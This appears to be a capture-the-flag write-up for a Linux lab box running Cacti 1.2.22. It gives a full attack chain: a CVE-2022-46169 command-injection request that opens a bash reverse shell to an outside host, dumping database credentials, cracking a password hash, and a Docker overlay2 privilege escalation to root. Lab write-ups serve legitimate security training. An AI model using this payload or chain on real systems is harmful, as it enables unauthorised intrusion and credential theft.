
## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
## 🛰️ Recon

### Nmap
```bash
nmap -p- --min-rate 10000 10.10.11.211
nmap -p 22,80 -sCV 10.10.11.211
```

### Web Service
- Found Cacti login page on port 80.
- Version: **Cacti 1.2.22** (footer).
- Default creds don’t work.
- Possible CVE: **CVE-2022-46169** (unauth RCE via `poller_id` injection).

---

## 💥 Exploitation (Initial Shell)

### Auth Bypass + Command Injection (Manual)
```http
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=$(bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1')
Header: X-Forwarded-For: 127.0.0.1
```

### [Reverse Shell](HTTP)
```bash
nc -lvnp 443
```

Result: Shell as `www-data` inside **Docker container**.

---

## 🧠 Enumeration (Container)

- Hostname: 50bca5e748b0 → Docker container.
- Found MySQL creds in `/var/www/html/include/config.php`:
  ```text
  DB Host: db
  DB User: root
  DB Pass: root
  ```

### MySQL Access
```bash
mysql -h db -u root -proot cacti
```

### Users Table
```sql
SELECT username, password FROM user_auth;
```

- `marcus:$2y$10$vcrYth5YcCLlZaPD...`
- Cracked with `john` → Password: **funkymonkey**

---

## 📥 Shell as Marcus (Host)

```bash
sshpass -p 'funkymonkey' ssh marcus@10.10.11.211
```

---

## 🧨 Privilege Escalation (Root)

### CVEs Exploited:
- **CVE-2021-41091**
- **CVE-2021-41103**

### Docker Leak Exploitation
```bash
# From host:
ls /var/lib/docker/overlay2/<hash>/merged

# From container (as root):
cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
```

### Host Escalation
```bash
/var/lib/docker/overlay2/<hash>/merged/tmp/0xdf -p
```

→ Result: Root shell on host.

---

## 🏁 Flags

```bash
# User
cat /home/marcus/user.txt

# Root
cat /root/root.txt
```
